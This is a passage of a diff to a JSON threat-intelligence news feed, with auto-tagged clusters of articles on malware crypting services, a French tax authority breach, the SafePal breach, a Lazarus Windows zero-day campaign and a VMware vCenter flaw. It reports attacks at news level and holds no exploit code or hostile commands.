See the Outlook and Mitigations section for details. Key Findings AV and endpoint detection and response (EDR) tools should not be treated as sufficient standalone protection against crypted payloads. Defenders should pair endpoint controls with behavioral detection, telemetry correlation, upstream hunting, suspicious process monitoring, and rapid triage of suspicious samples. Popular crypting service providers primarily advertise support for Windows payloads, with no identified advertising for macOS or Linux crypting services. However, although Windows environments were most frequently targeted by the services reviewed in this report, they are not inherently more susceptible to the execution of crypted payloads. Crypted payloads increase the likelihood of successful malware execution and delayed detection, but they do not independently provide end-to-end intrusion capability. Downstream activities, such as lateral movement, data theft, ransomware deployment, and follow-on compromise, depend on the embedded malware and the operator's objectives. Crypter risk varies significantly with provider maturity and technical capability: advanced crypters offer portability, anti-analysis, process injection, persistence, and security product bypass capabilities, whereas less-advanced crypters generally provide basic payload obfuscation techniques. Crypter capabilities are generally not novel individually, but their commercial packaging makes established defense-evasion tradecraft easier to access, reuse, and operationalize. The significance of crypters lies less in technical innovation than in making mature evasion methods available as paid services. The Crypter Landscape What Is a “Crypter”? “Crypting” is what threat researchers generally refer to as a service or product wherein a file, almost exclusively a malicious executable of some kind, is encrypted to bypass malware detection technologies. The result of a crypting service is a malicious payload that modifies the supplied executable in ways that deter defenders and endpoint security solutions (namely, AV and EDR products) from detecting and analyzing it. How Does Crypting Work? While the core functionality of a crypting service or product is to encrypt a payload, services vary in the capabilities they provide. These capabilities can range from the encryption algorithms used, which are often proprietary, to behavioral adjustments for how the resultant payload will execute in a victim environmen",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Recorded Future",
-          "cohort": "threat_research_primary",
-          "title": "Malware Crypting Services and the Threat Actors Who Sell Them",
-          "link": "https://www.recordedfuture.com/research/malware-crypting-services-threat-actors",
-          "published": "2026-08-13T00:00:00+00:00",
-          "summary": "Insikt Group analyzes 24 threat actors selling malware crypting services. Learn about their evasion techniques, market dynamics, and how defenders can prioritize behavioral detection over static analysis.",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
             }
           }
         }
@@ -5228,6 +5480,106 @@
             "content_type": "news_report",
             "confidence_tier": "tier_1_offensive_research",
             "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "5b5ad8b9f8",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "data_breach"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "financial_services",
+          "government"
+        ],
+        "affected_products": [
+          "Snowflake"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "incident_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "BleepingComputer",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "French tax authority data breach affects 678,000 individuals",
+        "link": "https://www.bleepingcomputer.com/news/security/french-tax-authority-data-breach-affects-678-000-individuals/",
+        "published": "2026-08-17T10:09:48+00:00",
+        "summary": "The French Ministry of the Economy and Finance has disclosed a data breach after an attacker accessed the General Directorate of Public Finances (DGFiP) systems and stole data belonging to 678,000 individuals. [...]",
+        "full_body": "French tax authority data breach affects 678,000 individuals By Sergiu Gatlan August 17, 2026 06:09 AM 0 The French Ministry of the Economy and Finance has disclosed a data breach after an attacker accessed the General Directorate of Public Finances (DGFiP) systems and stole data belonging to 678,000 individuals. This incident was discovered after a threat actor using the \"ZeroBytes\" handle claimed the attack and listed a stolen database for sale on August 12 on the PwnForums hacking forum. \"The in-depth investigations conducted since August 12, 2026, have established that, prior to their interruption, these access points had been used to consult and extract data concerning a total of 678,000 individuals and professionals, including tax data such as reference tax income, family quotient, and withholding tax rate, and, for businesses, data such as their company name and SIREN number,\" the French Finance Ministry said . \"Cadastral data relating to addresses and property sizes were also accessed. As soon as these data breaches were identified, the French Public Finances Directorate (DGFIP) notified the French Data Protection Authority (CNIL). The online accounts of individual and professional users were not compromised. User IDs and passwords were not compromised.\" After detecting the attack, the French tax administration shut down access to sensitive information systems and continues investigating the incident with the help of the National Cybersecurity Agency of France (ANSSI) to assess the breach's full impact. In a post on the hacking forum, ZeroBytes also claimed they gained access to the Serveur Professionnel de Données Cadastrales (SPDC), an online platform operated by the French tax authority that provides access to the country's central land registry and property ownership records. French DGFiP database for sale ( DarkWebSonar ) ​While the portal gave them access to data on roughly 20 million French citizens, the threat actor claims they only managed to steal 252,149 records containing data on over 2 million people. \"We couldn't finish the extraction because honestly, it's just horrible to scrape and would have taken months. I'm still logged into the panel, so if you want, you can buy it along with the database,\" they said. \"I'm not going to sell this one for very much anyway. And as always, no mention from France about this incident.\" The French Finance Ministry added on Friday that it will contact all affected individuals starting next week via email or letter, with details on what data may have been accessed or stolen and the necessary precautions to take. This is just the latest in a spree of cyberattacks and data breaches that have impacted multiple French government agencies in recent months. In January, the French data protection authority fined the national employment agency France Travail €5 million after hackers stole the personal information of 43 million people. One month later, the French Ministry of Finance disclosed another data breach affecting over 1.2 million user accounts after hackers stole a database from the national bank account registry (FICOBA) systems. More recently, France Titres, the government agency in France for issuing and managing administrative documents, also disclosed a data breach after a threat actor put up for sale a database containing 19 million records allegedly stolen from the National Agency for Secure Documents (ANTS). Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: France fines unemployment agency €5 million over data breach Valve notifies Steam hardware customers of a data breach Canadian pleads guilty to Snowflake cloud data-theft attacks Huggi",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "data_breach"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "financial_services",
+            "government"
+          ],
+          "affected_products": [
+            "Snowflake"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "Snowflake": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "BleepingComputer",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "French tax authority data breach affects 678,000 individuals",
+          "link": "https://www.bleepingcomputer.com/news/security/french-tax-authority-data-breach-affects-678-000-individuals/",
+          "published": "2026-08-17T10:09:48+00:00",
+          "summary": "The French Ministry of the Economy and Finance has disclosed a data breach after an attacker accessed the General Directorate of Public Finances (DGFiP) systems and stole data belonging to 678,000 individuals. [...]",
+          "taxonomy": {
+            "threat_categories": [
+              "data_breach"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "financial_services",
+              "government"
+            ],
+            "affected_products": [
+              "Snowflake"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Snowflake": "target"
+            },
             "weak_tags": {
               "products": []
             }
@@ -5580,141 +5932,7 @@
       ]
     },
     {
-      "cluster_id": "20c2a82904",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "credential_theft",
-          "data_breach",
-          "phishing_social_eng",
-          "zero_day"
-        ],
-        "actor_attribution": [
-          "Lazarus"
-        ],
-        "affected_industries": [
-          "financial_services",
-          "government",
-          "manufacturing_industrial"
-        ],
-        "affected_products": [
-          "AWS",
-          "Apple iOS/macOS",
-          "OpenAI/ChatGPT"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "zero_day"
-        ],
-        "content_type": [
-          "incident_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "Infosecurity Magazine",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "SafePal Data Breach Hits Tens of Thousands of Customers",
-        "link": "https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/",
-        "published": "2026-08-17T09:10:00+00:00",
-        "summary": "Nearly 40,000 customers of hardware wallet provider SafePal have been impacted by a data breach",
-        "full_body": "Infosecurity Magazine Home » News » SafePal Data Breach Hits Tens of Thousands of Customers SafePal Data Breach Hits Tens of Thousands of Customers News 17 August 2026 Written by Phil Muncaster UK / EMEA News Reporter , Infosecurity Magazine Email Phil Follow @philmuncaster The manufacturer of a popular cryptocurrency hardware wallet has told tens of thousands of its customers to be on the lookout for phishing attempts after it suffered a data breach. SafePal published an update on August 16 claiming that order information linked to 39,798 customers had been compromised in a recent incident. Customers who placed order between March 2, 2025 and April 11, 2026 are impacted. The stolen data includes names, email and shipping addresses, phone numbers and purchase details. “This incident did not involve your seed phrase, private keys, wallet password, or other wallet credentials, bank account information, payment card numbers, or government-issued identification numbers,” SafePal clarified. “SafePal never requests, collects, processes or stores such information from customers. No evidence has been found that the incident itself compromised access to SafePal wallets or funds.” Read more on crypto breaches: Coldcard Users Lose $89m After Bitcoin Wallet Is Hacked The breach appears to have stemmed from a vulnerability in the firm’s order-tracking function for a plug-in. “Under certain conditions, the flaw allowed unauthorized access to another customer's order information. We remediated the issue upon discovery and introduced additional security measures,” SafePal explained. The firm warned customers to expect “fraudulent phone calls, emails, text messages, letters, refund offers, firmware-update requests, fake customer-support communications” and other attempts to obtain their wallet credentials or additional personal information. It said it had already taken down over 30 fraudulent websites and phishing links associated with the incident. According to screenshots posted to X , an individual has put the stolen data up for sale, although their claims have not been verified. Advice for SafePal Customers SafePal has published a dedicated page via which to report scams, and a support channel for affected customers. It issued the following advice: Never share your seed phrase, private key, or password with anyone, even if they claim to be a SafePal employee Don’t click links or scan QR codes in unsolicited emails, text messages, or letters claiming to be from SafePal Type the SafePal web address manually into the browser rather than following a redirected link, including any link that appears to come from this notice Be on the lookout for any suspicious communication or impersonation, whether by phone, post or in person Report anything suspicious, including messages, calls, letters or websites You may also like Los Angeles Public Health Department Discloses Large Data Breach News 17 June 2024 BBC Pension Scheme Breached, Exposing Employee Data News 31 May 2024 Cybersecurity Incidents Account for a Third of ICO Reports in 2020 News 4 September 2020 Over 80% of Sports Organizations Targeted by Hackers in the Last Year News 12 June 2026 Qantas Confirms 5.7 Million Customers Hit by Data Breach News 10 July 2025 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice Ferrari Cybersecurity Head on Defending Formula 1’s Most Iconic Team Interview 20 July 2026 1 Researchers Confirm ExfilSquad’s Access to Sensitive Data Across 13 Organizations News 14 August 2026 2 New Mirai-Based Linux Botnet ‘Evooo1Bot’ Turns Victims Into Proxies News 14 August 2026 3 Novel macOS Infostealer AmnesiaStealer Spread via ClickFix News 14 August 2026 4 Exposed AWS Access Key Linked to Data Breach Affecting 1500+ UK Charities News 13 August 2026 5 Lazarus Used Post-Quantum Key Exchange to Deliver Zero-Day News 12 August 2026 6 NIST Seeks Public Input on AI-Ready NVD Modernization News 12 August 2026 1 OpenAI Launches Two-Tier Security Access Program A",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "phishing_social_eng",
-            "credential_theft",
-            "zero_day",
-            "data_breach"
-          ],
-          "actor_attribution": [
-            "Lazarus"
-          ],
-          "affected_industries": [
-            "financial_services",
-            "government",
-            "manufacturing_industrial"
-          ],
-          "affected_products": [
-            "Apple iOS/macOS",
-            "AWS",
-            "OpenAI/ChatGPT"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "zero_day"
-          ],
-          "content_type": "incident_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {
-            "Apple iOS/macOS": "target",
-            "AWS": "target",
-            "OpenAI/ChatGPT": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Infosecurity Magazine",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "SafePal Data Breach Hits Tens of Thousands of Customers",
-          "link": "https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/",
-          "published": "2026-08-17T09:10:00+00:00",
-          "summary": "Nearly 40,000 customers of hardware wallet provider SafePal have been impacted by a data breach",
-          "taxonomy": {
-            "threat_categories": [
-              "phishing_social_eng",
-              "credential_theft",
-              "zero_day",
-              "data_breach"
-            ],
-            "actor_attribution": [
-              "Lazarus"
-            ],
-            "affected_industries": [
-              "financial_services",
-              "government",
-              "manufacturing_industrial"
-            ],
-            "affected_products": [
-              "Apple iOS/macOS",
-              "AWS",
-              "OpenAI/ChatGPT"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "zero_day"
-            ],
-            "content_type": "incident_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "Apple iOS/macOS": "target",
-              "AWS": "target",
-              "OpenAI/ChatGPT": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "4d06d42e84",
+      "cluster_id": "22bf2708a0",
       "priority_score": 10,
       "member_count": 2,
       "corroborating_source_count": 2,
@@ -5724,6 +5942,7 @@
       "taxonomy": {
         "threat_categories": [
           "apt_espionage",
+          "phishing_social_eng",
           "web_shell_backdoor",
           "zero_day"
         ],
@@ -5731,16 +5950,11 @@
           "Lazarus"
         ],
         "affected_industries": [
-          "aviation_defense",
-          "financial_services",
-          "government"
+          "aviation_defense"
         ],
-        "affected_products": [
-          "Microsoft Windows"
-        ],
+        "affected_products": [],
         "tools_used": [],
         "cve_ids": [
-          "CVE-2025-49113",
           "CVE-2026-68820"
         ],
         "attack_techniques": [],
@@ -5755,16 +5969,17 @@
         ]
       },
       "primary": {
-        "source": "Infosecurity Magazine",
+        "source": "The Hacker News",
         "cohort": "cyber_news_breach_reporting",
-        "title": "Lazarus Used Post-Quantum Key Exchange to Deliver Zero-Day",
-        "link": "https://www.infosecurity-magazine.com/news/lazarus-post-quantum-key-dream-job/",
-        "published": "2026-08-12T13:35:00+00:00",
-        "summary": "Lazarus malware used post-quantum key exchange to protect delivery of a Windows zero-day exploit",
-        "full_body": "Infosecurity Magazine Home » News » Lazarus Used Post-Quantum Key Exchange to Deliver Zero-Day Lazarus Used Post-Quantum Key Exchange to Deliver Zero-Day News 12 August 2026 Written by Alessandro Mascellino News Reporter Email Alessandro Follow @a_mascellino Malware used by North Korea's Lazarus group negotiated its command channel using a post-quantum key exchange before pulling down a Windows zero-day exploit, in a campaign against defense and aerospace companies across Europe and India. Check Point Research reported the vulnerability to Microsoft on July 28 and published its analysis on August 11, the day a patch shipped. CVE-2026-68820 is a use-after-free race condition in AFD.sys, the driver handling network sockets in the Windows kernel, and was the only flaw in this the August Patch Tuesday release Microsoft flagged as under active exploitation. The activity is the latest wave of Operation Dream Job , which approaches employees at defense firms with fraudulent job offers. Targets included organizations working on surveillance sensors, drones and robotics, with activity or targeting in France, Germany, Brazil and India. Four Keys and a Layered Handshake Infection ran through MISTPEN, an in-memory downloader that communicates via attacker-controlled files on OneDrive using the Microsoft Graph API. After reconnaissance and persistence stages, it loaded a dedicated module to fetch the privilege escalation exploit. That module fingerprinted the host, then requested four public keys from the command server. It used them to generate fresh key material with Kyber/ML-KEM, the key encapsulation scheme NIST standardized in 2024 to resist attack by quantum computers , returning the encapsulated result before requesting the exploit itself, which it decrypted and ran in memory. Traffic through that channel carried a second encryption layer using GOST-CBC, on top of MISTPEN's own AES transport encryption. What arrived through the handshake was FudModule, Lazarus's kernel rootkit, in a build Check Point tracks as v3.1.It disables telemetry callbacks, removes minifilters, kills the NT Kernel Logger and blinds 94 Event Tracing for Windows (ETW) providers. Newly added is tampering with Smart App Control, resetting its policy state and forcing a code integrity reload. Command and Control on Borrowed Servers The group ran its infrastructure almost entirely on machines it did not own, using Roundcube webmail servers exploited through CVE-2025-49113 with credentials likely sourced from dark web leaks, alongside compromised PrestaShop sites. Each hosts RelayShell, a previously undocumented PHP webshell that acts as a message relay rather than a conventional command shell, passing traffic between operator and victim through session files. Check Point found evidence of at least 17 compromised relay servers. Delivery has also shifted. The group built at least three websites impersonating privacy technology vendor Enveil, some ranking top in search results. Check Point stressed Enveil was neither targeted nor compromised. Those sites distributed a trojanized PDF viewer that runs a payload hidden inside crafted documents, delivering Troy, a previously undocumented backdoor supporting 17 operator commands. You may also like Lazarus Group Targets Developers in New Data Theft Campaign News 17 January 2025 Lazarus Group Targeting Microsoft Web Servers to Launch Espionage Malware News 24 May 2023 Cybercrime a Key Revenue Stream For North Korea's Weapons Program News 5 August 2022 Aerospace Executives Targeted Via LinkedIn Recruitment Messages News 17 June 2020 US Government: North Korean Threat Actors Are Targeting Cryptocurrency Organizations News 20 April 2022 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice Ferrari Cybersecurity Head on Defending Formula 1’s Most Iconic Team Interview 20 July 2026 1 Researchers Confirm ExfilSquad’s Access to Sensitive Data Across 13 Organizations News 14 August 2026 2 New Mirai-Based Linux Bot",
+        "title": "Lazarus Exploits Windows Zero-Day to Gain SYSTEM Access and Deploy Backdoor",
+        "link": "https://thehackernews.com/2026/08/lazarus-exploits-windows-zero-day-to.html",
+        "published": "2026-08-12T17:39:27+00:00",
+        "summary": "The North Korean threat actor known as Lazarus Group has been attributed to the zero-day exploitation of a newly patched security flaw impacting Microsoft Windows to deliver a never-before-seen backdoor targeting defense and aerospace companies across France, Germany, Brazil, and India. The activity, per Check Point Research, is part of Operation Dream Job, a long-running cyber espionage and",
+        "full_body": "Lazarus Exploits Windows Zero-Day to Gain SYSTEM Access and Deploy Backdoor  Ravie Lakshmanan  Aug 12, 2026 Vulnerability / Cyber Espionage The North Korean threat actor known as Lazarus Group has been attributed to the zero-day exploitation of a newly patched security flaw impacting Microsoft Windows to deliver a never-before-seen backdoor targeting defense and aerospace companies across France, Germany, Brazil, and India. The activity, per Check Point Research, is part of Operation Dream Job , a long-running cyber espionage and social engineering campaign orchestrated by Pyongyang-backed hackers to target professionals worldwide with fake-but-compelling job offers at firms like Lockheed Martin and Enveil to steal sensitive data and install malware by approaching them on platforms like LinkedIn, pretending to be recruiters in an attempt to build trust. The attacks have been found to exploit CVE-2026-68820 (CVSS score: 7.0), a privilege escalation flaw affecting Windows Ancillary Function Driver for WinSock (\"AFD.sys\") that was patched by Microsoft as part of its Patch Tuesday updates for August 2026. Check Point Research told The Hacker News that it reported the vulnerability to Microsoft in late July 2026, although it said \"we are familiar with a successful implementation of the CVE in the beginning of June.\" As observed in prior campaign waves, victims are lured through bogus recruiter messages and tricked into opening a malicious PDF or installing a trojanized PDF viewer, which is then used to install a new backdoor called Troy that grants remote access to the compromised machine. The end goal of these intrusions is to seize complete control of infected computers and bypass security controls. The use of a trojanized PDF viewer is a tried-and-tested tactic adopted by the Lazarus Group in conjunction with Dream Job , with the threat actors abusing this method as far back as 2022. Two different parallel infection sequences have been detected as part of the latest attacks - DLL side-loading , in which victims are instructed to download an encrypted archive that's used to trigger a DLL side-loading chain. The malicious DLL (\"libmupdf.dll\") is used to display a bogus job description lure, while it stealthily downloads and executes in memory a lightweight downloader dubbed MISTPEN . The downloader communicates with threat actor-controlled infrastructure using Microsoft Graph API and OneDrive to retrieve and run reconnaissance and persistence modules and trigger the \"AFD.sys\" driver exploit, before deploying ForestTiger (aka ScoringMathTea), which provides remote access to the host. Trojanized \"SecurityPDF\" PDF viewer , in which victims are instructed to download SecurityPDF from a website impersonating Enveil. Once installed, it monitors for any PDF document opened through it for a special marker (\"This document is encrypted with sumatrapdf reader!!!!!!!!!!!!\"). If such a marker is present, the application decrypts and launches an embedded payload that's responsible for loading a backdoor called Troy directly into memory. The DLL implant supports 17 operator commands to facilitate file enumeration, upload and download, archive and exfiltration, interactive shell access, process termination, in-memory DLL injection, and configuration updates. High-level overview of the DLL sideloading infection chain. MISTPEN, for its part, loads at least four different modules - GetInfoPlugin (\"Release_GetInfoPlugin_x64.dll\"), to profile the host and exfiltrate the collected information as a single wide-character string PvPlugin (\"Release_PvPlugin_x64.dll\"), to collect host reconnaissance data and details about running processes OneScreenCapture (\"OneScreenCapture64.dll\"), to take screenshots of the current desktop, including all monitors, and transmit them as JPEG images LPE (local privilege escalation) loader , which gathers host information, generates new key material using the ML-KEM post-quantum key encapsulation algorithm, and uses the ne",
         "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
+            "phishing_social_eng",
             "zero_day",
             "apt_espionage",
             "web_shell_backdoor"
@@ -5773,17 +5988,12 @@
             "Lazarus"
           ],
           "affected_industries": [
-            "financial_services",
-            "government",
             "aviation_defense"
           ],
-          "affected_products": [
-            "Microsoft Windows"
-          ],
+          "affected_products": [],
           "tools_used": [],
           "cve_ids": [
-            "CVE-2026-68820",
-            "CVE-2025-49113"
+            "CVE-2026-68820"
           ],
           "attack_techniques": [],
           "urgency_signals": [
@@ -5791,58 +6001,13 @@
           ],
           "content_type": "news_report",
           "confidence_tier": "tier_4_news",
-          "role_map": {
-            "Microsoft Windows": "target"
-          },
+          "role_map": {},
           "weak_tags": {
             "products": []
           }
         }
       },
       "corroborating_sources": [
-        {
-          "source": "Infosecurity Magazine",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Lazarus Used Post-Quantum Key Exchange to Deliver Zero-Day",
-          "link": "https://www.infosecurity-magazine.com/news/lazarus-post-quantum-key-dream-job/",
-          "published": "2026-08-12T13:35:00+00:00",
-          "summary": "Lazarus malware used post-quantum key exchange to protect delivery of a Windows zero-day exploit",
-          "taxonomy": {
-            "threat_categories": [
-              "zero_day",
-              "apt_espionage",
-              "web_shell_backdoor"
-            ],
-            "actor_attribution": [
-              "Lazarus"
-            ],
-            "affected_industries": [
-              "financial_services",
-              "government",
-              "aviation_defense"
-            ],
-            "affected_products": [
-              "Microsoft Windows"
-            ],
-            "tools_used": [],
-            "cve_ids": [
-              "CVE-2026-68820",
-              "CVE-2025-49113"
-            ],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "zero_day"
-            ],
-            "content_type": "news_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "Microsoft Windows": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
         {
           "source": "The Hacker News",
           "cohort": "cyber_news_breach_reporting",
@@ -5852,6 +6017,7 @@
           "summary": "The North Korean threat actor known as Lazarus Group has been attributed to the zero-day exploitation of a newly patched security flaw impacting Microsoft Windows to deliver a never-before-seen backdoor targeting defense and aerospace companies across France, Germany, Brazil, and India. The activity, per Check Point Research, is part of Operation Dream Job, a long-running cyber espionage and",
           "taxonomy": {
             "threat_categories": [
+              "phishing_social_eng",
               "zero_day",
               "apt_espionage",
               "web_shell_backdoor"
@@ -5862,6 +6028,38 @@
             "affected_industries": [
               "aviation_defense"
             ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2026-68820"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "zero_day"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "Infosecurity Magazine",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Lazarus Used Post-Quantum Key Exchange to Deliver Zero-Day",
+          "link": "https://www.infosecurity-magazine.com/news/lazarus-post-quantum-key-dream-job/",
+          "published": "2026-08-12T13:35:00+00:00",
+          "summary": "Lazarus malware used post-quantum key exchange to protect delivery of a Windows zero-day exploit",
+          "taxonomy": {
+            "threat_categories": [
+              "zero_day"
+            ],
+            "actor_attribution": [
+              "Lazarus"
+            ],
+            "affected_industries": [],
             "affected_products": [],
             "tools_used": [],
             "cve_ids": [],
@@ -5882,8 +6080,8 @@
     {
       "cluster_id": "4535ef9ae8",
       "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
+      "member_count": 2,
+      "corroborating_source_count": 2,
       "strong_signals": [
         "CVE-2026-59310",
         "VMware"
@@ -5912,6 +6110,7 @@
           "critical_cvss"
         ],
         "content_type": [
+          "news_report",
           "vulnerability_disclosure"
         ],
         "confidence_tier": [
@@ -5992,6 +6191,34 @@
               "critical_cvss"
             ],
             "content_type": "vulnerability_disclosure",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "VMware": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "Dark Reading",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Global Threat Campaign Hits Critical VMware vCenter Flaw",
+          "link": "https://www.darkreading.com/vulnerabilities-threats/global-threat-campaign-critical-vmware-vcenter-flaw",
+          "published": "2026-08-13T20:45:17+00:00",
+          "summary": "Exploitation against CVE-2026–59310 began earlier this month, and patching the vulnerability may not be enough to fully mitigate the threat.",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "VMware"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
             "confidence_tier": "tier_4_news",
             "role_map": {
               "VMware": "target"
@@ -6400,6 +6627,140 @@
             "content_type": "news_report",
             "confidence_tier": "tier_4_news",
             "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "20c2a82904",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "credential_theft",
+          "data_breach",
+          "phishing_social_eng",
+          "zero_day"
+        ],
+        "actor_attribution": [
+          "Lazarus"
+        ],
+        "affected_industries": [
+          "financial_services",
+          "government",
+          "manufacturing_industrial"
+        ],
+        "affected_products": [
+          "AWS",
+          "Apple iOS/macOS",
+          "OpenAI/ChatGPT"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "zero_day"
+        ],
+        "content_type": [
+          "incident_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Infosecurity Magazine",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "SafePal Data Breach Hits Tens of Thousands of Customers",
+        "link": "https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/",
+        "published": "2026-08-17T09:10:00+00:00",
+        "summary": "Nearly 40,000 customers of hardware wallet provider SafePal have been impacted by a data breach",
+        "full_body": "Infosecurity Magazine Home » News » SafePal Data Breach Hits Tens of Thousands of Customers SafePal Data Breach Hits Tens of Thousands of Customers News 17 August 2026 Written by Phil Muncaster UK / EMEA News Reporter , Infosecurity Magazine Email Phil Follow @philmuncaster The manufacturer of a popular cryptocurrency hardware wallet has told tens of thousands of its customers to be on the lookout for phishing attempts after it suffered a data breach. SafePal published an update on August 16 claiming that order information linked to 39,798 customers had been compromised in a recent incident. Customers who placed order between March 2, 2025 and April 11, 2026 are impacted. The stolen data includes names, email and shipping addresses, phone numbers and purchase details. “This incident did not involve your seed phrase, private keys, wallet password, or other wallet credentials, bank account information, payment card numbers, or government-issued identification numbers,” SafePal clarified. “SafePal never requests, collects, processes or stores such information from customers. No evidence has been found that the incident itself compromised access to SafePal wallets or funds.” Read more on crypto breaches: Coldcard Users Lose $89m After Bitcoin Wallet Is Hacked The breach appears to have stemmed from a vulnerability in the firm’s order-tracking function for a plug-in. “Under certain conditions, the flaw allowed unauthorized access to another customer's order information. We remediated the issue upon discovery and introduced additional security measures,” SafePal explained. The firm warned customers to expect “fraudulent phone calls, emails, text messages, letters, refund offers, firmware-update requests, fake customer-support communications” and other attempts to obtain their wallet credentials or additional personal information. It said it had already taken down over 30 fraudulent websites and phishing links associated with the incident. According to screenshots posted to X , an individual has put the stolen data up for sale, although their claims have not been verified. Advice for SafePal Customers SafePal has published a dedicated page via which to report scams, and a support channel for affected customers. It issued the following advice: Never share your seed phrase, private key, or password with anyone, even if they claim to be a SafePal employee Don’t click links or scan QR codes in unsolicited emails, text messages, or letters claiming to be from SafePal Type the SafePal web address manually into the browser rather than following a redirected link, including any link that appears to come from this notice Be on the lookout for any suspicious communication or impersonation, whether by phone, post or in person Report anything suspicious, including messages, calls, letters or websites You may also like Los Angeles Public Health Department Discloses Large Data Breach News 17 June 2024 BBC Pension Scheme Breached, Exposing Employee Data News 31 May 2024 Cybersecurity Incidents Account for a Third of ICO Reports in 2020 News 4 September 2020 Over 80% of Sports Organizations Targeted by Hackers in the Last Year News 12 June 2026 Qantas Confirms 5.7 Million Customers Hit by Data Breach News 10 July 2025 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice Ferrari Cybersecurity Head on Defending Formula 1’s Most Iconic Team Interview 20 July 2026 1 Researchers Confirm ExfilSquad’s Access to Sensitive Data Across 13 Organizations News 14 August 2026 2 New Mirai-Based Linux Botnet ‘Evooo1Bot’ Turns Victims Into Proxies News 14 August 2026 3 